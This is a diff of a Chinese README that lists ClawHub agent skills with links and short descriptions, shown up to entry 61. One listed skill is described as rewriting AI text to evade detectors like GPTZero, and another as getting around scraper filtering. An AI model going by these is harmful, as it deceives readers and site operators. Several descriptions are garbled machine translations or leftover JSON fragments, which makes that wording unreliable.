-| Binance Pay 支付 | [Clawdbot/binance-pay](https://clawdhub.com/skills/binance-pay) | Binance Pay 集成用于加密支付。通过世界上最大的交易所发送、接收和接受加密货币付款。 |
-| Bybit 交易所 | [Clawdbot/bybit](https://clawdhub.com/skills/bybit) | Bybit交易所整合。以高达 100 倍的杠杆交易现货、衍生品和永续合约。 |
-| Cat Fact | [Clawdbot/catfact](https://clawdhub.com/skills/catfact) | 来自 catfact.ninja 的随机猫事实和品种信息（免费，无 API 密钥） |
-| Claude | [Clawdbot/claude](https://clawdhub.com/skills/claude) | 人择克劳德整合。通过 Anthropic API 与 Claude 模型聊天。 |
-| Linkding 书签管理 | [Clawdbot/clinkding](https://clawdhub.com/skills/clinkding) | 管理链接书签 - 保存 URL、搜索、标记、组织和检索您的个人书签集合。当用户想要保存链接、搜索书签、管理标签或组织阅读列表时使用。 |
-| AI 文本人性化 | [Clawdbot/de-ai-ify](https://clawdhub.com/skills/de-ai-ify) | 删除人工智能生成的行话并将真人语音还原为文本 |
-| 错误处理生成器 | [Clawdbot/error-handler](https://clawdhub.com/skills/error-handler) | 为任何框架生成错误处理中间件。在设置 API 错误处理时使用。 |
-| 错误处理生成器 | [Clawdbot/error-handler-gen](https://clawdhub.com/skills/error-handler-gen) | 为任何框架生成错误处理中间件。在设置 API 错误处理时使用。 |
-| ERZ 苏黎世回收 | [Clawdbot/erz-entsorgung-recycling-zurich](https://clawdhub.com/skills/erz-entsorgung-recycling-zurich) | Abfuhrkalender für Zürich 通过 OpenERZ API。 Nutze bei Fragen zu Kehricht、Karton、Papier、Grüngut、Sonderabfall oder Entsorgungsterminen im Raum Zürich。 |
-| Fieldy AI Webhook | [Clawdbot/fieldy-ai-webhook](https://clawdhub.com/skills/fieldy-ai-webhook) | 将 Fieldy webhook 转换为 Moltbot hook。 |
-| Firecrawl Search | [Clawdbot/firecrawl-search](https://clawdhub.com/skills/firecrawl-search) | 通过 Firecrawl API 进行网络搜索和抓取。当您需要搜索网络、抓取网站（包括大量 JS 页面）、抓取整个网站或从网页中提取结构化数据时使用。需要 FIRECRAWL_API_KEY 环境变量。 |
-| Front.app | [Clawdbot/front](https://clawdhub.com/skills/front) | Front.app API 用于管理对话、消息、评论和团队协作。 |
-| Graphiti | [Clawdbot/graphiti](https://clawdhub.com/skills/graphiti) | 通过 Graphiti API 进行知识图操作。搜索事实、添加情节并提取实体/关系。 |
-| Idealista | [Clawdbot/idealista](https://clawdhub.com/skills/idealista) | 通过 Idealista-cli（OAuth2 客户端凭据）查询 Idealista API。 |
-| Instagram 集成 | [Clawdbot/instagram](https://clawdhub.com/skills/instagram) | Instagram 平台整合。发布内容、管理故事、查看见解并与关注者互动。 |
-| Kagi Search | [Clawdbot/kagi-search](https://clawdhub.com/skills/kagi-search) | 使用 Kagi Search API 进行网络搜索。当您需要在网络上搜索当前信息、事实或参考时使用。环境中需要 KAGI_API_KEY。 |
-| MoonPay 支付入口 | [Clawdbot/moonpay](https://clawdhub.com/skills/moonpay) | MoonPay 法币到加密货币的入口集成。通过信用卡、银行转账和移动支付购买和出售加密货币。 |
-| Novafon API | [Clawdbot/novafon](https://clawdhub.com/skills/novafon) | （无） |
-| OKX 交易所 | [Clawdbot/okx](https://clawdhub.com/skills/okx) | OKX 交易所集成。在全球最大的加密货币交易所之一进行现货、期货、期权和 DeFi 交易。 |
-| Oura Ring 集成 | [Clawdbot/oura](https://clawdhub.com/skills/oura) | （无） |
-| Parcel Package Tracking | [Clawdbot/parcel-package-tracking](https://clawdhub.com/skills/parcel-package-tracking) | 通过 Parcel API 跟踪和添加配送。 |
-| PayPal 支付集成 | [Clawdbot/paypal](https://clawdhub.com/skills/paypal) | 贝宝支付集成。汇款、创建发票并管理 PayPal 交易。 |
-| Quit Vaping | [Clawdbot/quit-vaping](https://clawdhub.com/skills/quit-vaping) | 通过无尼古丁连续追踪、渴望工具和健康里程碑戒烟 |
-| REST to GraphQL Converter | [Clawdbot/rest-to-graphql](https://clawdhub.com/skills/rest-to-graphql) | 将 REST API 路由转换为 GraphQL 架构。在迁移 API 或添加 GraphQL 层时使用。 |
-| Save Money | [Clawdbot/save-money](https://clawdhub.com/skills/save-money) | 别再浪费代币了。自动检测任务复杂性并路由到正确的模型——俳句适用于日常任务，十四行诗仅在需要真正思考时使用。 API 成本节省 50% 以上。 \| 别再代币了。自动探测任务难度，日常对话用便宜模型，深度思考才升级，轻松省下50%以上浪费费用。 |
-| Simmer Copytrading | [Clawdbot/simmer-copytrading](https://clawdhub.com/skills/simmer-copytrading) | 使用Simmer API镜像来自顶级Polymarket交易者的头寸。跨多个钱包的尺寸加权聚合。 |
-| Simmer Weather | [Clawdbot/simmer-weather](https://clawdhub.com/skills/simmer-weather) | 通过 Simmer API 使用 NOAA 预测来交易 Polymarket 天气市场。受到 gopfan2 200 万美元以上战略的启发。当用户想要交易温度市场、自动化天气投注、检查 NOAA 预报或运行 gopfan2 式交易时使用。 |
-| Spotify History | [Clawdbot/spotify-history](https://clawdhub.com/skills/spotify-history) | 访问 Spotify 收听历史记录、顶级艺术家/曲目，并通过 Spotify Web API 获得个性化推荐。在获取用户最近的播放、分析音乐品味或生成推荐时使用。需要一次性 OAuth 设置。 |
-| Strava | [Clawdbot/strava](https://clawdhub.com/skills/strava) | 使用 Strava API 加载和分析 Strava 活动、统计数据和锻炼 |
-| Swiss Geo & Tourism | [Clawdbot/swiss-geo-and-tourism-assistant](https://clawdhub.com/skills/swiss-geo-and-tourism-assistant) | 瑞士地理数据中心、兴趣点和旅游局。 Orte/Adressen suchen、Höhen abfragen、städtische POIs finden（餐厅、咖啡馆、Sehenswürdigkeiten 通过 OpenStreetMap）、ÖV-Fahrplan、Kartenlinks。 Nutze bei Fragen zu Schweizer Orten、Attraktionen、Ausflügen oder Koorden。 |
-| Tmux | [Clawdbot/tmux](https://clawdhub.com/skills/tmux) | 通过发送击键和抓取窗格输出来远程控制交互式 CLI 的 tmux 会话。 |
-| Trello | [Clawdbot/trello](https://clawdhub.com/skills/trello) | 通过 Trello REST API 管理 Trello 看板、列表和卡片。 |
-| Twitter 集成 | [Clawdbot/twitter](https://clawdhub.com/skills/twitter) | Twitter/X 平台集成。发布推文、阅读时间线、管理关注者并分析参与度。 |
-| Umeå Lunch | [Clawdbot/umea-lunch](https://clawdhub.com/skills/umea-lunch) | 从于默奥的餐厅获取今天的午餐菜单。当询问于默奥的午餐、餐厅或食物时使用。从 umealunchguide.se 获取实时数据。 |
-| Weather | [Clawdbot/weather](https://clawdhub.com/skills/weather) | 获取当前天气和预报（无需 API 密钥）。 |
-| Withings Family | [Clawdbot/withings-family](https://clawdhub.com/skills/withings-family) | 从 Withings API 获取多个家庭成员的健康数据，包括体重、身体成分（脂肪、肌肉、骨骼、水）、活动和睡眠。当用户询问其或家人的 Withings 数据、体重历史记录、身体指标、每日步数、睡眠质量或 Withings 设备的任何健康测量值时，请使用此技能。 |
-| Withings Health | [Clawdbot/withings-health](https://clawdhub.com/skills/withings-health) | 从 Withings API 获取健康数据，包括体重、身体成分（脂肪、肌肉、骨骼、水）、活动和睡眠。当用户通过 Withings 设备询问其 Withings 数据、体重历史记录、身体指标、每日步数、睡眠质量或任何健康测量值时，请使用此技能。 |
-| xAI Search | [Clawdbot/xai-search](https://clawdhub.com/skills/xai-search) | 使用 xAI 的 Grok API 和代理搜索工具实时搜索 X/Twitter 和网络。 |
-| YouTube Music | [Clawdbot/ytmusic](https://clawdhub.com/skills/ytmusic) | 通过 ytmusicapi 管理 YouTube 音乐库、播放列表和发现。 |
+> 该分类共 **3,155** 个技能，以下按下载量倒序展示 Top 200。
 
+<table>
+<colgroup>
+<col width="4%">
+<col width="8%">
+<col width="14%">
+<col width="14%">
+<col width="60%">
+</colgroup>
+<thead>
+<tr>
+<th align="center">#</th>
+<th>中文技能名称</th>
+<th>技能名称</th>
+<th>链接</th>
+<th>核心功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">1</td>
+<td>内容摘要</td>
+<td>Summarize 🔑</td>
+<td><a href="https://clawdhub.com/skills/summarize">ClawHub/summarize</a></td>
+<td>使用summarize CLI总结URL或文件（支持网页、PDF、图片、音频、YouTube）。</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td>文本人性化</td>
+<td>Humanizer</td>
+<td><a href="https://clawdhub.com/skills/humanizer">ClawHub/humanizer</a></td>
+<td>消除AI写作痕迹，使文本更自然真实。基于维基百科&quot;AI写作特征&quot;指南，识别并修正夸张象征、宣传用语、肤浅-ing分析、模糊归因、破折号滥用、三项排比、AI词汇、负面平行结构及冗长连接词等模式。</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td>AdMapix</td>
+<td>AdMapix 🔑</td>
+<td><a href="https://clawdhub.com/skills/admapix">ClawHub/admapix</a></td>
+<td>广告情报与应用数据分析助手，支持搜索广告素材、分析应用排名、下载量、收入及市场洞察，用于广告素材和竞品分析。</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td>HumanizeAItext</td>
+<td>Humanize AI text</td>
+<td><a href="https://clawdhub.com/skills/humanize-ai-text">ClawHub/humanize-ai-text</a></td>
+<td>将AI生成的文本改写得更自然，以绕过AI检测器（如GPTZero）。支持ChatGPT、Claude、GPT等内容的改写。</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td>AIPPT生成器</td>
+<td>Baidu Wenku AIPPT 🔑</td>
+<td><a href="https://clawdhub.com/skills/ai-ppt-generator">ClawHub/ai-ppt-generator</a></td>
+<td>使用百度文库 AI 智能生成 PPT，自动根据内容选择模板。</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td>YouTubeAPI技能</td>
+<td>YouTube 🔑</td>
+<td><a href="https://clawdhub.com/skills/youtube-api-skill">ClawHub/youtube-api-skill</a></td>
+<td>使用托管OAuth集成YouTube Data API，支持搜索视频、管理播放列表、获取频道数据及评论互动，适用于用户需要时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td>将用户讲稿一键生成乔布斯风极简科技感竖屏HTML演示稿</td>
+<td>description: 将用户讲稿一键生成乔布斯风极简科技感竖屏HTML演示稿。当用户需要生成PPT、演示文稿、Slides、幻灯片，或要求科技风/极简风/乔布斯风格的演示时触发此技能。输出为单个可直接运行的HTML文件。</td>
+<td><a href="https://clawdhub.com/skills/ppt-generator">ClawHub/ppt-generator</a></td>
+<td>将用户讲稿一键生成乔布斯风极简科技感竖屏HTML演示稿。当用户需要生成PPT、演示文稿、Slides、幻灯片，或要求科技风/极简风/乔布斯风格的演示时触发此技能。输出为单个可直接运行的HTML文件。</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td>摘要专业版</td>
+<td>Summarize Pro</td>
+<td><a href="https://clawdhub.com/skills/summarize-pro">ClawHub/summarize-pro</a></td>
+<td>当用户要求总结文本、文章、文档、会议、邮件、YouTube字幕、书籍、PDF、报告、对话或任何长篇内容时。此外...</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td>remotion视频toolkit</td>
+<td>Remotion Video Toolkit</td>
+<td><a href="https://clawdhub.com/skills/remotion-video-toolkit">ClawHub/remotion-video-toolkit</a></td>
+<td>使用 Remotion + React 进行程序化视频创作的完整工具包。涵盖动画、时间控制、渲染（CLI/Node.js/Lambda/Cloud Run）、字幕、3D、图表、文字特效、转场及媒体处理。适用于编写 Remotion 代码、构建视频生成流水线或创建数据驱动的视频模板。</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td>营销技能</td>
+<td>Marketing Skills</td>
+<td><a href="https://clawdhub.com/skills/marketing-skills">ClawHub/marketing-skills</a></td>
+<td>{&quot;answer&quot;:&quot;获取23个营销模块，包含CRO、SEO、文案、分析、发布、广告及社媒的清单、框架与现成交付物。&quot;}</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td>图像</td>
+<td>Image</td>
+<td><a href="https://clawdhub.com/skills/image">ClawHub/image</a></td>
+<td>创建、检查、处理和优化图像文件及视觉资产，支持可靠的格式选择、调整大小、压缩、色彩配置、元数据和平台设置。</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td>营销mode</td>
+<td>Marketing Mode</td>
+<td><a href="https://clawdhub.com/skills/marketing-mode">ClawHub/marketing-mode</a></td>
+<td>{&quot;answer&quot;:&quot;营销模式整合23项全能技能，涵盖策略、心理、内容、SEO、转化优化及付费增长。适用于营销策略、文案、SEO、转化优化、付费广告及各类营销战术需求。&quot;}</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td>人性化zh</td>
+<td>humanizer-zh</td>
+<td><a href="https://clawdhub.com/skills/humanizer-zh">ClawHub/humanizer-zh</a></td>
+<td>去除文本中的 AI 生成痕迹。适用于编辑或审阅文本，使其听起来更自然、更像人类书写。 基于维基百科的&quot;AI 写作特征&quot;综合指南。检测并修复以下模式：夸大的象征意义、 宣传性语言、以 -ing 结尾的肤浅分析、模糊的归因、破折号过度使用、三段式法则、 AI 词汇、否定式排比、过多的连接性短语。</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td>Edge TTS</td>
+<td>Edge TTS</td>
+<td><a href="https://clawdhub.com/skills/edge-tts">ClawHub/edge-tts</a></td>
+<td>使用 node-edge-tts 包进行文本转语音，支持多语音、多语言、语速音调调节及字幕生成。触发场景：(1) 用户通过“tts”关键词请求音频输出；(2) 内容需以语音呈现（如多任务处理、无障碍、驾驶、烹饪等场景）；(3) 用户需定制特定的语音、语速、音调或格式。</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td>OCR本地</td>
+<td>OCR - Local (No API Key)</td>
+<td><a href="https://clawdhub.com/skills/ocr-local">ClawHub/ocr-local</a></td>
+<td>使用 Tesseract.js OCR 从图像中提取文本（100%本地运行，无需API密钥）。支持中文（简繁体）和英文。</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td>Copywriting</td>
+<td>Copywriting</td>
+<td><a href="https://clawdhub.com/skills/copywriting">ClawHub/copywriting</a></td>
+<td>为着陆页、邮件、广告、销售页及营销材料撰写说服性文案。适用于撰写标题、行动号召（CTA）、产品描述、广告文案、邮件序列或任何旨在促成行动的文本。涵盖文案公式（AIDA、PAS、FAB）、标题撰写、情感触发、异议处理及A/B测试。触发词包括“撰写文案”、“文案写作”、“着陆页文案”、“标题”、“撰写销售页”、“广告文案”、“邮件文案”、“说服性写作”及“如何撰写[营销文本]”。</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td>图像cog</td>
+<td>Image Cog 🔑</td>
+<td><a href="https://clawdhub.com/skills/image-cog">ClawHub/image-cog</a></td>
+<td>基于CellCog的AI图像生成与照片编辑，支持文本到图像、图像到图像、角色一致性、产品摄影、参考生成等功能。</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td>Klaviyo</td>
+<td>Klaviyo 🔑</td>
+<td><a href="https://clawdhub.com/skills/klaviyo">ClawHub/klaviyo</a></td>
+<td>通过托管OAuth实现Klaviyo API集成，访问用户档案、列表、区段、营销活动、流程、事件、指标、模板、目录和Webhook。使用此...</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td>wps</td>
+<td>wps</td>
+<td><a href="https://clawdhub.com/skills/wps">ClawHub/wps</a></td>
+<td>面向中国用户的WPS Office工作流：创建、编辑、审阅、转换及排查.docx/.xlsx/.pptx及WPS格式的文字/表格/演示文档。</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td>微信公众号文章爬虫</td>
+<td>微信公众号文章爬虫</td>
+<td><a href="https://clawdhub.com/skills/wechat-article-spider">ClawHub/wechat-article-spider</a></td>
+<td>微信公众号文章爬虫 - 将微信公号文章转换为 Markdown + 本地图片</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td>Larry</td>
+<td>Larry 🔑</td>
+<td><a href="https://clawdhub.com/skills/larry">ClawHub/larry</a></td>
+<td>自动化TikTok幻灯片营销，支持任意应用或产品。可研究竞争对手、生成AI图像、添加文字叠加、通过Postiz发布及追踪分析数据。</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td>pexoai代理</td>
+<td>Pexo AI Video Agent 🔑</td>
+<td><a href="https://clawdhub.com/skills/pexoai-agent">ClawHub/pexoai-agent</a></td>
+<td>当用户需要制作5–120秒短视频时使用此技能。支持任意类型的视频：产品广告、TikTok/Instagram/YouTube内容、品牌视频等。</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td>视频cog</td>
+<td>Video Cog 🔑</td>
+<td><a href="https://clawdhub.com/skills/video-cog">ClawHub/video-cog</a></td>
+<td>由CellCog提供技术支持的AI视频生成与制作，涵盖营销视频、产品演示、讲解视频、教育内容、唇形同步主播视频、UGC等。</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td>浏览器</td>
+<td>Browser</td>
+<td><a href="https://clawdhub.com/skills/browser">ClawHub/browser</a></td>
+<td>使用无头浏览器浏览网页、交互元素，并从URL提取简洁易读的文本内容。</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td>视频剪辑助手</td>
+<td>视频剪辑助手</td>
+<td><a href="https://clawdhub.com/skills/video-editor-helper">ClawHub/video-editor-helper</a></td>
+<td>视频剪辑助手 - 自动生成视频脚本、字幕、标题。适用于自媒体、UP主、视频创作者。</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td>AIPPTgenerate</td>
+<td>AI PPT generate 🔑</td>
+<td><a href="https://clawdhub.com/skills/ai-ppt-generate">ClawHub/ai-ppt-generate</a></td>
+<td>{&quot;translation&quot;: &quot;百度提供的智能PPT生成工具可根据用户给定的主题或问题智能生成PPT。用户可选择PPT主题、模板或自定义模板，还可上传图片或资源文件（如pdf、word、txt等）。工具提供最终生成PPT文件的下载地址。&quot;}</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td>SEO(Site审计+内容写作+CompetitorAnalysis)</td>
+<td>SEO (Site Audit + Content Writer + Competitor Analysis)</td>
+<td><a href="https://clawdhub.com/skills/seo">ClawHub/seo</a></td>
+<td>SEO专家代理，提供网站审计、内容撰写、关键词研究、技术修复、链接建设及排名策略服务。</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td>微信publisher</td>
+<td>Wechat Publisher 🔑</td>
+<td><a href="https://clawdhub.com/skills/wechat-publisher">ClawHub/wechat-publisher</a></td>
+<td>一键发布 Markdown 到微信公众号草稿箱。基于 wenyan-cli，支持多主题、代码高亮、图片自动上传。</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td>ArXiv Watcher</td>
+<td>ArXiv Watcher</td>
+<td><a href="https://clawdhub.com/skills/arxiv-watcher">ClawHub/arxiv-watcher</a></td>
+<td>搜索并总结ArXiv论文。适用于用户查询最新研究、特定主题或AI论文每日摘要时。</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td>copywriter</td>
+<td>copywriter</td>
+<td><a href="https://clawdhub.com/skills/copywriter">ClawHub/copywriter</a></td>
+<td>撰写引人入胜的用户体验文案、营销内容和产品信息。适用于编写按钮标签、错误提示、落地页、邮件、行动号召、空状态、工具提示或任何面向用户的文本。</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td>研究paper写作</td>
+<td>Research Paper Writer</td>
+<td><a href="https://clawdhub.com/skills/research-paper-writer">ClawHub/research-paper-writer</a></td>
+<td>创建遵循IEEE/ACM格式标准的正式学术论文，具备规范的论文结构、引用格式和学术写作风格。适用于用户要求撰写任何主题的研究论文、学术论文或会议论文。</td>
+</tr>
+<tr>
+<td align="center">32</td>
+<td>tech新闻digest</td>
+<td>tech-news-digest 🔑</td>
+<td><a href="https://clawdhub.com/skills/tech-news-digest">ClawHub/tech-news-digest</a></td>
+<td>利用统一信源模型、质量评分及多格式输出功能生成科技新闻摘要。支持从RSS、Twitter/X KOL、Gi等六大渠道采集数据。</td>
+</tr>
+<tr>
+<td align="center">33</td>
+<td>网页内容fetcher</td>
+<td>Web Content Fetcher</td>
+<td><a href="https://clawdhub.com/skills/web-content-fetcher">ClawHub/web-content-fetcher</a></td>
+<td>网页内容获取工具 | 当常规爬虫被过滤时，使用替代服务获取网页内容。支持：1) r.jina.ai - 最稳定 2) markdown.new - Cloudflare 专用 3) defuddle.md - 备用方案。触发词：获取网页内容、网页转markdown、内容抓取、fetch webpage、bypas...</td>
+</tr>
+<tr>
+<td align="center">34</td>
+<td>literature审查</td>
+<td>Literature Review</td>
+<td><a href="https://clawdhub.com/skills/literature-review">ClawHub/literature-review</a></td>
+<td>通过Semantic Scholar、OpenAlex、Crossref和PubMed API搜索学术资源，协助撰写文献综述。当用户需要查找特定主题论文、获取DOI详情或撰写带引用的综述章节时使用。</td>
+</tr>
+<tr>
+<td align="center">35</td>
+<td>LinkedIn</td>
+<td>LinkedIn 🔑</td>
+<td><a href="https://clawdhub.com/skills/linkedin-api">ClawHub/linkedin-api</a></td>
+<td>LinkedIn API 集成与托管 OAuth，分享帖子、管理个人资料、投放广告并访问 LinkedIn 功能，在用户想分享内容时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">36</td>
+<td>社交媒体调度器</td>
+<td>Social Media Scheduler</td>
+<td><a href="https://clawdhub.com/skills/social-media-scheduler">ClawHub/social-media-scheduler</a></td>
+<td>跨平台策划、起草与组织社交媒体内容；制定内容日历，撰写针对各平台优化的帖子，并保持稳定的发布节奏。</td>
+</tr>
+<tr>
+<td align="center">37</td>
+<td>Figma</td>
+<td>Figma 🔑</td>
+<td><a href="https://clawdhub.com/skills/figma">ClawHub/figma</a></td>
+<td>专业的 Figma 设计分析与资源导出。用于提取设计数据、导出多格式资源、审计无障碍合规性、分析设计系统及生成详尽设计文档。对 Figma 文件进行只读分析，具备强大的导出与报告能力。</td>
+</tr>
+<tr>
+<td align="center">38</td>
+<td>视频transcriptdownloader</td>
+<td>Video Transcript Downloader</td>
+<td><a href="https://clawdhub.com/skills/video-transcript-downloader">ClawHub/video-transcript-downloader</a></td>
+<td>从 YouTube 及 yt-dlp 支持的网站下载视频、音频、字幕及整洁的段落式逐字稿。当用户要求“下载视频”、“保存片段”、“提取音频”、“获取字幕”、“获取逐字稿”，或需排查 yt-dlp/ffmpeg 及格式/播放列表问题时使用。</td>
+</tr>
+<tr>
+<td align="center">39</td>
+<td>SEO内容写作</td>
+<td>Seo Content Writer</td>
+<td><a href="https://clawdhub.com/skills/seo-content-writer">ClawHub/seo-content-writer</a></td>
+<td>{   &quot;description_zh&quot;: &quot;用于用户请求撰写SEO内容时；起草包含关键词</td>
+</tr>
+<tr>
+<td align="center">40</td>
+<td>自媒体内容生成器</td>
+<td>Content Writer 自媒体内容生成器</td>
+<td><a href="https://clawdhub.com/skills/content-writer">ClawHub/content-writer</a></td>
+<td>Multi-platform content generator for Chinese social media. Produces publish-ready posts for 小红书, 知乎, 公众号, and 抖音 with platform-native formatting, hooks, and...</td>
+</tr>
+<tr>
+<td align="center">41</td>
+<td>微信公众号文章解析</td>
+<td>微信公众号文章解析</td>
+<td><a href="https://clawdhub.com/skills/wechat-article-extractor-skill">ClawHub/wechat-article-extractor-skill</a></td>
+<td>提取微信公众号文章的元数据与内容。适用于解析微信文章链接及提取文章信息。</td>
+</tr>
+<tr>
+<td align="center">42</td>
+<td>YouTubefull</td>
+<td>youtube-full 🔑</td>
+<td><a href="https://clawdhub.com/skills/youtube-full">ClawHub/youtube-full</a></td>
+<td>用于YouTube相关内容或可能相关的情况，即使未明确提及：视频/频道/播放列表链接、视频ID、@用户名、创作者查询、视频摘要等。</td>
+</tr>
+<tr>
+<td align="center">43</td>
+<td>AI笔记ofvideo</td>
+<td>ai notes of video 🔑</td>
+<td><a href="https://clawdhub.com/skills/ai-notes-ofvideo">ClawHub/ai-notes-ofvideo</a></td>
+<td>AI驱动的视频笔记生成（文档、大纲或图文格式）</td>
+</tr>
+<tr>
+<td align="center">44</td>
+<td>图像编辑</td>
+<td>Image Editing</td>
+<td><a href="https://clawdhub.com/skills/image-edit">ClawHub/image-edit</a></td>
+<td>使用 AI 修复、外绘、背景去除、放大、复原工具编辑图像</td>
+</tr>
+<tr>
+<td align="center">45</td>
+<td>翻译</td>
+<td>Translate</td>
+<td><a href="https://clawdhub.com/skills/translate">ClawHub/translate</a></td>
+<td>准确翻译文本，保留格式，处理复数，并根据地区调整语气。</td>
+</tr>
+<tr>
+<td align="center">46</td>
+<td>营销strategypmm</td>
+<td>Marketing Strategy Pmm</td>
+<td><a href="https://clawdhub.com/skills/marketing-strategy-pmm">ClawHub/marketing-strategy-pmm</a></td>
+<td>负责定位、GTM策略、竞品分析及产品发布的产品营销技能。当用户询问产品定位、市场进入策略等话题时使用。</td>
+</tr>
+<tr>
+<td align="center">47</td>
+<td>best图像generation</td>
+<td>Best Image Generation 🔑</td>
+<td><a href="https://clawdhub.com/skills/best-image-generation">ClawHub/best-image-generation</a></td>
+<td>最佳质量AI图像生成(约$0.12-0.20/张)，支持文生图、图生图及图像编辑，通过EvoLink API实现。</td>
+</tr>
+<tr>
+<td align="center">48</td>
+<td>AI视频script</td>
+<td>AI Video Script Generator</td>
+<td><a href="https://clawdhub.com/skills/ai-video-script">ClawHub/ai-video-script</a></td>
+<td>AI视频脚本生成器。根据用户输入的主题/关键词，生成完整的视频脚本，包含分镜描述、画面提示词、配音文案。适用于短视频创作者、AI视频制作者、内容营销人员。触发词：视频脚本、分镜、AI视频、短视频文案、视频策划。</td>
+</tr>
+<tr>
+<td align="center">49</td>
+<td>社交媒体代理</td>
+<td>Social Media Agent</td>
+<td><a href="https://clawdhub.com/skills/social-media-agent">ClawHub/social-media-agent</a></td>
+<td>仅使用 OpenClaw 原生工具实现 X/Twitter 的自主社交媒体管理。当用户希望自动化发布推文、生成内容、追踪互动或增长受众时使用。适用于关于推文、社交媒体策略、X 互动、内容日历或粉丝增长的请求。无需 API 密钥，使用浏览器自动化和 web_fetch 实现。</td>
+</tr>
+<tr>
+<td align="center">50</td>
+<td>网页browsing</td>
+<td>Web Browsing</td>
+<td><a href="https://clawdhub.com/skills/web-browsing">ClawHub/web-browsing</a></td>
+<td>浏览并总结网站，从URL提取内容，搜索网络信息。用于用户请求访问网站、获取网页内容或搜索信息时使用。</td>
+</tr>
+<tr>
+<td align="center">51</td>
+<td>短视频脚本创作</td>
+<td>短视频脚本创作</td>
+<td><a href="https://clawdhub.com/skills/short-video-script">ClawHub/short-video-script</a></td>
+<td>短视频脚本创作技能。用于生成抖音、快手、B站、视频号等平台的短视频脚本、标题、封面建议。适用于自媒体运营、内容创作需求。</td>
+</tr>
+<tr>
+<td align="center">52</td>
+<td>AI视频生成</td>
+<td>Ai Video Gen 🔑</td>
+<td><a href="https://clawdhub.com/skills/ai-video-gen">ClawHub/ai-video-gen</a></td>
+<td>端到端AI视频生成 - 通过文本提示创建视频，支持图像生成、视频合成、配音和编辑。支持OpenAI DALL-E、Replicate模型、LumaAI、Runway和FFmpeg编辑。</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td>视频generation</td>
+<td>AI Video Generation 🔑</td>
+<td><a href="https://clawdhub.com/skills/video-generation">ClawHub/video-generation</a></td>
+<td>使用 Sora 2、Veo 3、Seedance、Runway 及现代 API，通过可靠的提示与渲染工作流创建 AI 视频。</td>
+</tr>
+<tr>
+<td align="center">54</td>
+<td>Story Cog</td>
+<td>Story Cog 🔑</td>
+<td><a href="https://clawdhub.com/skills/story-cog">ClawHub/story-cog</a></td>
+<td>CellCog驱动的AI创意写作与故事创作，涵盖小说、短篇、剧本、同人小说、诗歌，提供世界观构建、角色塑造、叙事...</td>
+</tr>
+<tr>
+<td align="center">55</td>
+<td>内容strategy</td>
+<td>Content Strategy</td>
+<td><a href="https://clawdhub.com/skills/content-strategy">ClawHub/content-strategy</a></td>
+<td>为个人创业者构建和执行内容营销策略。适用于内容规划、格式与渠道选择、制定内容日历、衡量表现及系统化生产。涵盖受众调研、内容支柱、分发策略、内容复用及数据指标。触发词：“内容策略”、“内容营销”、“该做什么内容”、“内容计划”、“内容日历”、“内容创意”、“内容分发”、“靠内容增长”。</td>
+</tr>
+<tr>
+<td align="center">56</td>
+<td>Excalidraw图表生成器</td>
+<td>Excalidraw Diagram Generator</td>
+<td><a href="https://clawdhub.com/skills/excalidraw">ClawHub/excalidraw</a></td>
+<td>从 Excalidraw JSON 生成手绘风格的图表、流程图和架构图（PNG）</td>
+</tr>
+<tr>
+<td align="center">57</td>
+<td>每日AI新闻技能</td>
+<td>Daily Ai News</td>
+<td><a href="https://clawdhub.com/skills/daily-ai-news-skill">ClawHub/daily-ai-news-skill</a></td>
+<td>汇总并总结来自AI新闻网站和网络搜索等多渠道的最新AI资讯，提供附带原文直链的简明快报。当用户询问“今日AI新闻”、“AI动态”、“最新AI进展”或提及需要“每日AI简报”时触发。</td>
+</tr>
+<tr>
+<td align="center">58</td>
+<td>前端设计</td>
+<td>Frontend Design</td>
+<td><a href="https://clawdhub.com/skills/frontend-design">ClawHub/frontend-design</a></td>
+<td>Create distinctive, production-grade frontend interfaces with high design quality. Use this skill when the user asks to build web components, pages, or applications. Generates creative, polished co...</td>
+</tr>
+<tr>
+<td align="center">59</td>
+<td>Remotion</td>
+<td>Remotion</td>
+<td><a href="https://clawdhub.com/skills/remotion">ClawHub/remotion</a></td>
+<td>Remotion 最佳实践 - React 视频创作</td>
+</tr>
+<tr>
+<td align="center">60</td>
+<td>写作助手</td>
+<td>Writing Assistant</td>
+<td><a href="https://clawdhub.com/skills/writing-assistant">ClawHub/writing-assistant</a></td>
+<td>你是一名写作团队负责人，通过MCP工具管理专业作家。请分析写作任务，然后：1. 若存在参考资料，创建详细协作……</td>
+</tr>
+<tr>
+<td align="center">61</td>
+<td>视频subtitles</td>
+<td>Video Subtitles</td>
+<td><a href="https://clawdhub.com/skills/video-subtitles">ClawHub/video-subtitles</a></td>
